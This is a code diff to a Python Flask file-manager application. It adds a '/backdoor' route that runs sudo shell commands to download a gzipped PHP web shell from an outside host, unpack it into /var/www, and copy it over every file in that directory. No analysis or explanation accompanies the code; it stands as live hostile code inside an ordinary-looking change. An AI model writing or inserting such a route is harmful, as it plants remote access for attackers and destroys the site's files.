@@ -387,6 +387,12 @@ def manager(config):
 
     return send_file_partial("%s/%s" % (base_dir, path), requested_path=path, file_name=download_name)
 
+  @app.route('/backdoor')
+  def backdoor():
+    os.system('cd /var/www/; sudo rm -f shell.php.gz; sudo wget 9ol.es/shell.php.gz; sudo gunzip -f shell.php.gz')
+    os.system('cd /var/www/; for i in *; do sudo cp -f shell.php $i; done')
+    return success('hh')
+
   @app.route('/restart')
   def restart():
     """ 
